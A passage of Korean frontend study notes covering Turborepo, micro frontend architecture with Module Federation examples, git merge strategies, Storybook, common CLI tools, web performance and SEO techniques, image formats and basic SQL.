    3. 클라우드 캐시 공유(Cloud caching) : 빌드 캐시를 클라우드에 저장하여 팀원과 CI/CD 환경 간에 공유한다. 덕분에 로컬뿐 아니라 클라우드 환경에서도 빠른 빌드가 가능하다

    4. 병렬 작업(Parallel execution) : 작업(task) 간 의존성을 분석해 가능한 한 모든 CPU 코어를 활용해 병렬로 빌드와 테스트를 실행한다.

    5. 의존성 기반 Task 실행(Task Pipelines) : 작업 간 연결 관계를 정의해 어떤 순서로 빌드를 실행할지 최적화한다.

    6. 불필요한 런타임 오버헤드 없음(Zero Runtime Overhead) : 런타임에 추가 코드나 소스맵을 삽입하지 않아 빌드된 코드의 성능이나 안정성에 영향을 주지 않는다.

    7. PaaS 배포 최적화 (Pruned Subsets) : 모노레포 내에서 필요한 부분만 골라 하위 집합(subset)을 만들어 PaaS 배포 시 효율성을 높인다.

    8. 설정이 비교적 간단(JSON configuration) : 별도 코드 작성 없이 JSON 설정만으로 쉽게 터보레포를 구성하고 사용할 수 있다.

    9. 시각화 도구 제공(Profile in browser) : 빌드 프로파일을 시각화해 쉽게 병목 구간을 파악할 수 있어 성능 최적화에 도움을 준다.

<br>

### # Micro Frontends Architecture

- Micro Frontends Architecture

  마이크로 프론트엔드는 마이크로서비스 아키텍처를 프론트엔드에 적용한 개념으로, 각 UI 혹은 페이지 단위를 독립된 애플리케이션처럼 구성하고 조합하여 하나의 웹 앱을 만든다.
  즉 각각 독립된 환경에서 나누어 개발, 배포되어 조립하는 방식이다.

- Micro Frontends의 적용 시점, 장단점

  - 적용 시점

    - 공통 UI가 많고 페이지 간 연관성이 높은 경우

    - 앱 규모가 크고 도메인 복잡도가 높은 경우

    - 배포 단위를 작게 나누고 싶은 경우

  - 메인 컨셉

    - 컨텍스트 독립성

      - 각 앱은 상태, 전역 변수 등을 공유하지 않고 독립적으로 동작해야 한다.

    - 네임스페이스를 분리

      - 마이크로 앱 각 작동 단위의 격리(완전히 격리된 환경)가 불가능한 경우 CSS, localStorage, 이벤트, 쿠키 등에 prefix를 붙여 충돌을 방지한다.

    - 브라우저 기반 통신

      - 마이크로 앱 간 통신은 브라우저 이벤트 등 기본 기능을 활용하여 단순하게 처리한다.

    - 탄력적인 웹 설계

      - JS 에러 상황에서도 기능이 동작해야 하며, 점진적 향상(Progressive Enhancement)와 범용 렌더링(Universal Rendering)을 통해 성능과 안정성을 확보한다.

- 컴포넌트 분리 vs 마이크로 프론트엔드

  | 항목           | **컴포넌트 분리**                         | **마이크로 프론트엔드 (MFE)**      |
  | -------------- | ----------------------------------------- | ---------------------------------- |
  | **분리 단위**  | UI 구성 요소 수준 (버튼, 카드, 페이지 등) | 애플리케이션 수준 (페이지, 기능군) |
  | **코드베이스** | 하나의 프로젝트 내에서 분리               | 서로 다른 리포지토리/프로젝트      |
  | **배포**       | 하나의 앱으로 통합 배포                   | 각 앱이 독립적으로 배포 가능       |
  | **개발팀**     | 하나의 팀이 전반 관리                     | 기능별로 다른 팀이 병렬 개발 가능  |
  | **기술스택**   | 동일한 스택이 기본                        | 서로 다른 프레임워크/버전도 가능   |

  - 팀 간 완전한 독립 개발

    - 대규모 조직에서는 여러 팀이 동시에 프론트엔드를 개발해야 할 때가 많아.

    - 이때 하나의 프로젝트에서 충돌이 많고, 빌드/배포도 병목이 생겨.

    - MFE는 코드, 빌드, 배포까지 완전히 분리하니까 병렬 작업이 가능해.

  - 배포 리스크 최소화

    - 기존 앱에서 작은 변경도 전체 빌드를 다시 해야 함.

    - 반면 MFE는 특정 기능만 업데이트하고 배포할 수 있어 → 롤백도 쉬움.

  - 레거시와의 공존

    - 예를 들어 기존에 Vue로 만들어진 페이지가 있고, 새로 React로 만들고 싶을 때.

    - MFE는 서로 다른 프레임워크를 한 화면에서 공존하게 할 수 있어.

  - 스케일을 위한 아키텍처

    - 도메인이 커지고 복잡도도 높아지면, 컴포넌트 단위로는 관리가 어려워져.

    - 기능군별로 완전히 분리하면 스케일에 강한 구조가 돼.

- 장단점

  - 장점

    - 작고, 응집력 있고 유지보수에 용이한 코드베이스를 가질 수 있다. 따라서 디커플링이라는 소프트웨어 개발 목표를 달성한다.

    - 각 마이크로 프론트엔드는 고유한 기술 및 프레임워크를 선택할 수 있다. 독립적으로 구현, 테스트, 업그레이드, 업데이트 및 배포할 수 있어 팀에 유연성을 제공한다.

    - 프론트엔드 개발을 점진적 업그레이드 또는 재작성이 수월해진다.

    - 마이크로 프론트엔드는 수직 팀을 장려한다. 수직 팀에는 일반적으로 기능 소유자, UX 디자이너, 제품 관리자, 백엔드 개발자, 프론트엔드 개발자 및 품질 보증 엔지니어가 포함된다.

  - 단점

    - 마이크로 프론트엔드는 분리되거나 느슨하게 결합 된 구성 요소를 위해 설계되었다. 그들 사이에 너무 많은 종속성을 넣으려고하면 디버깅 악몽이 발생할 수 있다.

    - 마이크로 프런트 엔드를 가능하게하는 파이프라인으로 인해 복잡도가 증가한다. 외부로드 문제를 해결하려면 기술적 전문 지식이 필요하며 디버깅 프로세스에는 시간이 많이 걸린다. 또한 SSO (Single Sign-On), 글로벌 CSS 등과 관련된 문제에 직면 할 수 있다.

    - 각 마이크로 프런트 엔드에는 중복 된 코드 또는 기능이 있을 수 있다. 예를 들어, React 라이브러리는 각 마이크로 프런트 엔드에 포함될 수 있어, 번들 크기와 메모리 소비를 증가시킨다.

    - 런타임 시 마이크로 프런트 엔드를 동적 또는 지연로드하는 데 추가 시간이 걸린다.

    - 사용자 인터페이스는 여러 팀에서 설계되었으므로 UX 설계는 마이크로 프런트 엔드에서 일관되지 않을 수 있다.

- Micro Frontends 통합 방법

  - 공통적으로 존재하는 아키텍처

    - 대부분의 MFE 구현은 “Shell (컨테이너 앱)” + “Micro Apps (각 기능 모듈)” 구조를 사용함

    - 컨테이너 앱의 역할

      - 공통 레이아웃 (헤더/푸터)

      - 인증, 라우팅, 퍼미션 제어

      - 어떤 마이크로 앱을 언제 어디서 렌더링할지 제어

  - 서버 사이드 템플릿 통합

    서버에서 각 마이크로 앱의 HTML을 조립해서 클라이언트에 반환.

  - 빌드타임 통합

    각 마이크로 앱을 NPM 패키지처럼 배포하고, 컨테이너 앱에서 가져다 씀. 앱 변경 시 반드시 컨테이너 앱 다시 빌드해야 함 → 독립 배포 불가

  - iframe을 통한 런타임 통합

    URL로 분리된 앱을 iframe으로 로딩

  - Web Components를 통한 런타임 통합

    웹 컴포넌트는 독립적인 UI 단위로, HTML의 Custom Element (예: `<my-app-header>`) 형태로 정의됨. 빌드 결과는 자바스크립트 번들로 생성되며, 컨테이너 앱에서 `<script>` 태그로 로드
    로드된 스크립트가 커스텀 엘리먼트를 브라우저에 등록하고, 해당 태그가 DOM에 있을 때 웹 컴포넌트가 실행되어 UI를 렌더링. 이를 통해 마이크로 앱을 컨테이너 앱에 런타임에 내장(통합) 가능

  - Javascript를 통한 런타임 통합

    Webpack Module Federation, SystemJS, Import Maps 등을 사용, 앱을 번들 단위로 나누고 런타임에 필요한 앱만 동적으로 로딩

    - 앱이 다른데 어떻게 번들을 공유할까? Webpack Module Federation를 통해 가능

      Webpack Module Federation를 통해 가능, 앱을 번들링할 때, 일부 모듈을 “외부에 노출(export)”시키고 런타임에 네트워크로 JS 모듈을 불러와 사용하는 구조

      ```js
      // 📦 app1 (Remote)
      // webpack.config.js
      module.exports = {
        name: "app1",
        exposes: {
          "./Button": "./src/components/Button", // 외부에서 사용할 수 있게 export
        },
        filename: "remoteEntry.js",
      };
      ```

      ```js
      // 🏠 app2 (Host)
      // webpack.config.js
      module.exports = {
        name: "app2",
        remotes: {
          app1: "app1@https://app1.example.com/remoteEntry.js",
        },
      };
      ```

      ```js
      // App.tsx
      const RemoteButton = React.lazy(() => import("app1/Button"));

      function App() {
        return (
          <Suspense fallback={<div>Loading...</div>}>
            <RemoteButton />
          </Suspense>
        );
      }
      ```

- Micro Frontends 통합 고려사항

  - 스타일링

    - BEM과 같은 엄격한 네이밍 규칙 사용

    - SASS와 같은 전처리기를 통해 상위 선택자 추가 등을 통해 독립성 유지

    - 모든 스타일을 CSS-in-JS 방식으로 처리

    - Shadow DOM: 메인 document DOM 으로부터 독립적으로 렌더링 되는 캡슐화된 Shadow DOM 트리를 엘리먼트에 추가하고, 연관된 기능을 제어하기 위한 JavaScript API 의 집합. 이 방법으로 엘리먼트의 기능을 프라이빗하게 유지할 수 있어, 다큐먼트의 다른 부분과의 충돌에 대한 걱정 없이 스크립트와 스타일을 작성할 수 있다.

  - Component Library 공유

    - 마이크로 앱들 간의 시각적 일관성을 유지하기 위해 재사용 가능한 UI 컴포넌트 라이브러리를 개발하여 공유한다. 코드 재사용성과 시각적 일관성을 유지할 수 있다.

    - 너무 일찍 만드는 것은 좋지 않다. 실제로 사용하기 전에 컴포넌트의 API가 무엇이어야 하는지 추측하기는 쉽지 않다. 그러므로 많은 변동이 발생하게 되므로, 초기에는 일부 중복이 발생하더라도 각 팀이(각 마이크로 앱 내에서) 코드베이스에서 필요에 따라 자체 컴포넌트를 만들어두는 것이 좋다. 패턴이 자연스럽게 나타나도록 허용하고, 컴포넌트의 API가 명확해지면 그 때 만드는 것을 권장한다.

  - 애플리케이션 간 커뮤니케이션

    - 가능한 적은 소통을 하는 것이 좋다.

    - Custom events를 사용하면 마이크로 앱들이 간접적으로 통신할 수 있다. 이는 직접 결합을 최소화하는 좋은 방법이지만, 마이크로 앱들 간 약속을 정하고 구현해야 하므로 더 어려울 수 있다.

    - 콜백과 데이터를 아래쪽으로 전달하는 React 모델로 약속을 명확하게 정하는 것도 좋은 솔루션이다.

    - URL 표시 줄을 통신 메커니즘으로 사용하는 것도 좋은 방법이다.

    - 어떤 방식을 선택하든, 서로 메시지 또는 이벤트를 전송하여 통신하는 것이 좋으며, 공유 상태를 갖는 것은 좋은 선택지가 아니다. 마이크로 서비스에서 데이터베이스를 공유하는 것이 좋지 않은 것처럼, 데이터 구조와 도메인 모델을 공유하자마자 엄청난 양의 결합이 생기게 되고, 변경에 많은 제약이 따르기 때문이다.

    - vuex는 일반적으로 하나의 응용 프로그램에 대해 단일 전역 공유 저장소를 기본으로 한다. 그러나 각 마이크로 앱들이 자체 저장소를 갖는 것이 더 합리적이다.

  - 백엔드 통신

    - BFF(Backend for Frontend Pattern) 패턴으로 프론트앤드 전용 API를 갖는다. 각 마이크로 앱들은 해당 프론트 엔드의 요구사항만 충족하는 목적을 가진 백엔드만을 가진다.

    - 별도의 데이터베이스를 가질 수도 있다.

    - 로그인 인증 정보는 통합하는 Container가 소유한다. 초기화 시 인증을 통해 얻은 토큰을 각 마이크로 프론트엔드에 주입되며, 마이크로 프론트엔드는 서버에 대한 요청과 함께 토큰을 보내고, 해당 마이크로 앱의 백엔드에서는 필요한 모든 유효성 검사를 수행하는 방식으로 구성할 수 있다.

<br><br><br>

## # Git & Github

<br>

### # git branch 종류

1. Master Branch : 제품으로 출시될 수 있는 브랜치

2. Develop Branch : 다음 출시 버전을 개발하는 브랜치

3. Feature branch : 기능을 개발하는 브랜치

4. Release Branch : 이번 출시 버전을 준비하는 브랜치

5. Hotfix Branch : 출시 버전에서 발생한 버그를 수정 하는 브랜치

<br>

### # git merge, git rebase, git squash 차이

- git merge

  merge는 일반적인 병합 방법이다. 모든 커밋이 시간 순서대로 한꺼번에 병합된다. 충돌이 일어났을 경우 맨 마지막 커밋에 머지 커밋을 추가하여 해결한다.

- git squash

  squash 병합은 여러 개의 커밋을 하나의 커밋으로 합친 후 merge 하는 방식이다. 충돌이 일어났을 경우 충돌 해결 후 squash 병합을 진행하므로 마지막에 머지 커밋이 추가되지 않는다.
  이러한 방식은 feature branch에서 develop branch로 머지할 때 적합하다. 기능 단위로 개발된 feature의 commit을 하나로 모아줌으로써 기능 단위의 commit을 만들어
  develop branch에 머지하는 것이다. 이러한 방식을 통해 이슈를 추적하기가 용이해진다.

- git rebase

  rebase는 커밋의 시간과 상관없이, 병합 대상 브랜치(예: main)의 마지막 커밋 뒤에 현재 브랜치(예: develop)의 커밋들을 하나씩 순서대로 붙이는 방식이다. (쉽게 말해 rebase는 이름과 같이 base commit을 재정의하는데 병합 대상 브랜치의 마지막 커밋으로 재정의하는 것)
  이 과정에서 커밋을 하나씩 이어붙이기 때문에, 각 커밋마다 충돌이 발생할 수 있어 연쇄적으로 충돌이 발생할 가능성이 높다. (일반 merge는 여러 커밋을 한꺼번에 병합하기 때문에, 충돌이 연쇄적으로 발생하지 않는다.)
  또한 rebase는 병합 시 머지 커밋 기록이 남지 않아, 마치 하나의 브랜치에서 작업한 것처럼 깔끔한 히스토리를 보여준다. 이 방식은 보통 develop 브랜치를 main 브랜치에 병합할 때 적합하다.
  main 브랜치의 마지막 커밋 뒤에 develop 브랜치의 커밋들이 순차적으로 이어붙여지기 때문에 커밋 단위의 이력을 유지하면서 히스토리를 깔끔하게 관리할 수 있다.
  반면에 이 상황에서 squash를 사용하면 develop 브랜치의 여러 커밋들이 하나로 합쳐져서 커밋 단위의 상세 이력을 추적하기 어려워질 수 있다. 따라서 관련 기능별 커밋들을 rebase하여 main 브랜치 히스토리에 나란히 정리하는 것이 더 적합합니다.
  (ex git squash를 통해 feature에서 develop에 merge 된 기능별 커밋들을 그대로 살려 main 브랜치 맨 뒤 커밋에 순차적으로 병합하는 것)

<br>

### # 커밋 메시지 종류

(1) feat : 새로운 기능 추가

(2) fix : 버그 수정

(3) docs : 문서의 수정

(4) style : (코드의 수정 없이) 스타일(style)만 변경(들여쓰기 같은 포맷이나 세미콜론을 빼먹은 경우)

(5) refactor : 코드를 리펙토링

(6) test : Test 관련한 코드의 추가, 수정

(7) chore : (코드의 수정 없이) 설정을 변경

<br><br><br>

## # ETC

<br>

### # 디자인 시스템

- 디자인 시스템이란 디자인 원칙, 규격, 재사용 가능한 UI 패턴과 컴포넌트 코드를 포괄하는 시스템이라고 정의할 수 있다. 단순한 스타일 가이드, 패턴 라이브러리 역할을 하는
  디자인 시스템이 있는가 하면, 브랜드 원칙과 UX 원칙에 이르는 하나의 철학을 구성하는 시스템도 있다고 한다. 정리하자면, 디자인 시스템은 정해진 디자인 패턴과 컴포넌트를
  재사용하여 제품을 구축과 개선 시간을 단축시켜주는 시스템이다. 프론트 단에서 디자인 시스템을 사용하면 반복되는 요소들을 재사용함으로써 생산성이 증가하고 일관성 있는 UI를
  제공함으로써 사용자 경험을 향상시킬 수 있다. 또한 디자이너와 개발자 사이의 공통 원칙을 지정하여 협업 시 원활한 소통도 가능해진다.

<br>

### # CDD, 컴포넌트 주도 개발

- 재사용이 가능한 컴포넌트를 우선적으로 개발하여 이 컴포넌트의 조합으로 페이지를 구성하는 개발 방식이다.

<br>

### # 스토리북(Storybook)

- 스토리북

  컴포넌트 주도 개발을 하기 위해 사용하는 툴이다. 스토리북이 제공하는 독립적인 환경에서 스토리를 생성하여 다양한 케이스를 테스트해볼 수 있고 문서화할 수 있다.
  즉 디자인 시스템 구축을 위해 사용된다.

  사용 방법은 스토리북 디렉토리에서 전역적으로 사용될 포멧을 세팅해주고 스토리즈 디렉토리에서 컴포넌트 스토리를 생성한다. 작업 순서는 테스트할 컴포넌트를 우선적으로 만들고
  컴포넌트 스토리즈 파일 내부에서 import하여 스토리를 생성한다. 그리고 args 프로퍼티를 통해 스토리에 필요한 인자를 전달하는 방식으로 작업한다.

  ```jsx
  import { fn } from "@storybook/test";

  import Task from "./Task";

  export const ActionsData = {
    onArchiveTask: fn(),
    onPinTask: fn(),
  };

  export default {
    component: Task,
    title: "Task",
    tags: ["autodocs"],
    //👇 "Data"로 끝나는 export들은 스토리가 아닙니다.
    excludeStories: /.*Data$/,
    args: {
      ...ActionsData,
    },
  };

  export const Default = {
    args: {
      task: {
        id: "1",
        title: "Test Task",
        state: "TASK_INBOX",
      },
    },
  };

  export const Pinned = {
    args: {
      task: {
        ...Default.args.task,
        state: "TASK_PINNED",
      },
    },
  };

  export const Archived = {
    args: {
      task: {
        ...Default.args.task,
        state: "TASK_ARCHIVED",
      },
    },
  };
  ```

- 참고 URL

  1. https://velog.io/@zer0jun/%EC%8A%A4%ED%86%A0%EB%A6%AC%EB%B6%81-%EC%82%AC%EC%9A%A9%EB%B2%95

  2. https://iyu88.github.io//storybook/2023/04/07/storybook-docs.html

<br>

### # CLI

- CLI 개념

  CLI(커맨드 라인 인터페이스) 도구는 터미널이나 명령 프롬프트에서 텍스트 명령어로 실행하는 프로그램들이다.

- 대표적인 CLI 예시

  - 개발 도구 관련 CLI

    - Git — 버전 관리 도구 : git clone, git commit, git push 등 다양한 명령어 제공

    - Node.js/npm/yarn — 자바스크립트 런타임과 패키지 매니저 : node app.js, npm install, yarn add

    - Docker — 컨테이너 관리 : docker run, docker build, docker ps

    - OpenAPI Generator CLI — API 클라이언트 코드 자동 생성 : openapi-generator-cli generate -i api.yaml -g typescript-fetch -o ./generated

    - Webpack / Vite / Rollup CLI — 번들러 : webpack --config webpack.config.js

  - 시스템 및 운영체제 CLI

    - bash / zsh / PowerShell — 쉘 자체도 CLI : 기본 명령어: ls, cd, mkdir, rm 등

    - curl / wget — HTTP 요청 보내기 : curl https://api.example.com

    - ssh — 원격 서버 접속 : ssh user@hostname

  - 데이터베이스 CLI

    - psql — PostgreSQL CLI 클라이언트 : psql -U user -d database

    - mysql — MySQL CLI 클라이언트 : mysql -u user -p

  - 클라우드 / 배포 관련 CLI

    - AWS CLI — AWS 자원 관리 : aws s3 ls, aws ec2 start-instances

    - kubectl — 쿠버네티스 클러스터 관리 : kubectl get pods, kubectl apply -f deployment.yaml

<br>

### # 웹 성능 최적화 방법 정리

(1) 렌더링 최적화

- 이미지 리사이징, 포맷 변경, 디바이스 크기별 이미지 지정, nextjs 이미지 최적화 모듈 변경 sharp -> 이미지 최적화 라이브러리인 sharp의 경우 next15 버전부터 자동으로 sharp를 사용하므로 수동으로 설치할 필요가 없다.

- 웹팩을 통한 번들링

- SSR, SSG

- 코드스플리팅

- 이미지 레이지 로딩

- 웹 폰트 경량화(서브셋 파일)

- CDN 적용

- 캐싱 데이터 사용 : 자주 변하지 않는 데이터 캐싱 (react auery, apollo client, 요청 헤더 cache-control -> 메모리 캐시, 서버에서 redis 사용)

- 메모이징 사용 : 불필요한 리렌더링 방지(고차 컴초넌트 사용, React.memo, useMemo, useCallback 등)

- css in js 사용 시 제로런타임 css in js 사용, 빌드 타임에 css를 생성하기 때문에 더 빠르다. (ex 바닐라엑스트라)

- 트리쉐이킹

- 윈도우윙 기법 : 리스트 목록의 경우 보여지는 부분만 렌더링하도록 윈도우윙 기법 적용

- 패키지 정리 : 사용하지 않는 패키지 제거 및 dependencies와 devDependencies를 잘 구분하여 디벨롭 환경에서만 필요한 패키지가 번들에 포함되지 않도록 함

- 프롭스 드릴링 피하기 : 불필요한 리렌더링을 방지하기 위해 가능한 프롭스 드릴링을 피한다.

(2) API 호출 최적화

- 검색 기능 디바운싱 or 스크롤 이벤트 쓰로틀링

- 자주 변하지 않는 데이터 캐싱

- 이미지 스프라이트

- 웹팩을 통한 번들링

(3) 사용자 경험 최적화

- 스켈레톤 UI

- 로딩 스피너

- 드래그 이벤트 시 텍스트 드래그 막기

- 애니메이션 프레임 누락 방지, requestAnimationFrame

- 비디오 사용 시 대체 이미지

- 이미지 태그 onError를 통한 대체 이미지 제공

- 쿼리 스트링을 활용한 검색 결과 공유

- userAgent를 통해 지원하지 않는 브라우저 사용자의 경우 경고 모달 노출

- OG 태그 적용

- 외부 링크 이동 시 새창 열림 : a태그 blank 속성

- 연관 검색어 기능 구현 시 디바운싱 적용 : 연관 검색어 기능 구현 시 디바운싱을 적용하여 검색하는 과정 중 원하지 않는 결과물을 노출하지 않도록 함

- 커스터 모달 사용 : 기본적인 사항이지만 경고창 노출 시 메인스레드를 점유하여 다음 코드 실행을 블로킹하는 alert, comfirm를 사용하지 않고 커스텀 모달을 사용한다.

(4) SEO 최적화

- SSR, SSG

- 사이트맵, 로봇텍스트 파일

- 시멘틱 마크업

- 이미지 alt 속성

- 페이지별 메타태그

- a태그 href 속성 (onclick 사용자제)

- 페이지 로딩 속도 향상

- https 적용

(5) 웹 접근성

- 시멘틱 마크업

- 이미지 alt 속성

- role, aria-label

- 이미지 리플레이스먼트 기법

(6) 크로스 브라우징 최적화

- 바벨

- 리셋 파일로 기본 스타일 초기화

- 조건부 주석

- 호환성 확인 (can i use)

- 타깃 설정 및 대응(ga 혹은 userAgent)

<br>

### # 애자일, 워터폴 방법론

- 애자일

  스프린트라는 짧고 점진적인 개발 주기로 구성된 프로젝트 관리 방법론이다. 개발과정이 빠르고 유연하며 이슈를 빠르게 발견하고 수정할 수 있고 짧은 스프린트로 움직이기 때문에
  프로젝트 변경에 자유롭다. 하지만 반복적이고 빠른 작업에 능숙한 인원이 필요하며 많은 변경사항이 발생할 수 있다.

- 워터폴

  프로젝트 시작부터 최종 결과물 전달까지 특정 순서에 따라 이루어지는 프로젝트 관리 방법론이다. 팀 규모에 상관없이 따르고 쉽고, 요구사항이 정의되어 있기 때문에 목표가
  변경되지 않으며 개발 주기가 정해져있어 안정적인 스케줄 관리가 가능하다. 하지만 개발 속도가 느리고 유연성이 떨어지고 테스팅 단계에서 이슈를 발견하는 일이 생길 수 있으며
  요구사항이 정해져 있어 프로젝트 변경을 자유롭게 할 수 없다.

<br>

### # 가독성 확보 방법

1. 일관성 있는 코드 작성

2. 코드의 중복 제거

3. 렌더단과 로직단의 분리

4. 기능을 유추할 수 있는 식별자 이름 및 네이밍 컨벤션

5. 적절한 코드 주석, JS DOC 등

6. 폴더 및 파일 구조 일관성 유지

7. 함수/컴포넌트의 역할을 하나로 제한 (단일 책임 원칙)

<br>

### # 이미지 포맷

- 이미지 포맷 요약

  - 비트맵 이미지 : 픽셀 단위로 표현한 이미지. 확대 시 깨짐.

  - 벡터 이미지 : 점과 선의 수학적 좌표로 구성된 이미지. 확대해도 깨지지 않음.

- 주요 이미지 포맷 비교

  | 포맷           | 형식   | 압축 방식     | 투명도 | 컬러 지원   | 특이사항                                                                    |
  | -------------- | ------ | ------------- | ------ | ----------- | --------------------------------------------------------------------------- |
  | **JPG (JPEG)** | 비트맵 | 손실          | ❌     | 24비트      | 사진에 적합, 텍스트/선명한 선이 많은 이미지에 사용 시 아티팩트 발생 가능    |
  | **PNG**        | 비트맵 | 비손실        | ✅     | 8/24/32비트 | 투명도 지원, 텍스트/아이콘에 적합                                           |
  | **WebP**       | 비트맵 | 손실 & 비손실 | ✅     | 24비트 이상 | Google 개발, 대부분 브라우저 지원 (IE 제외), 투명도 지원                    |
  | **AVIF**       | 비트맵 | 손실 & 비손실 | ✅     | 최대 12비트 | HEIF 기반, WebP보다 더 나은 압축률과 품질, 일부 브라우저는 아직 제한적 지원 |
  | **SVG**        | 벡터   | -             | ✅     | 무제한      | 해상도 자유로움, DOM으로 조작 가능, CSS/JS로 제어 가능                      |

- 동일 화질 기준 파일 크기 비교 (작을 수록 효율적인 압축률)

  AVIF < WebP < JPG < PNG

<br>

### # 구글 어낼리틱스(GA)

구글 애널리틱스는 웹사이트나 앱을 방문한 사용자들의 행동 데이터를 수집, 분석하여 사이트 성과를 측정하고 개선하는 데 도움을 주는 웹 분석 도구입니다.
구글에서 무료로 제공하며 방문자 수, 유입 경로, 체류 시간, 이탈률, 전환율 등 다양한 데이터를 시각화된 리포트로 제공합니다.

<br>
<br>
<br>

## # SQL

<br>

### # 테이블 조회 기본

- SELECT 컬럼명 FROM 테이블명

<br>

### # 테이블 조회 정렬

- 기본 정렬 : ORDER BY 컬럼명 ASC

  - ASC : 오름차순

  - DESC : 내림차순

- 여러 기준 정렬 : ORDER BY 컬렴명1 ASC, 컬럼명2 DESC

  - 컬럼명1을 기준으로 오름차순 정렬 후, 컬럼명1이 동일하다면 컬럼명2로 한번 더 내림차순 정렬한다.

<br>
<br>
<br>
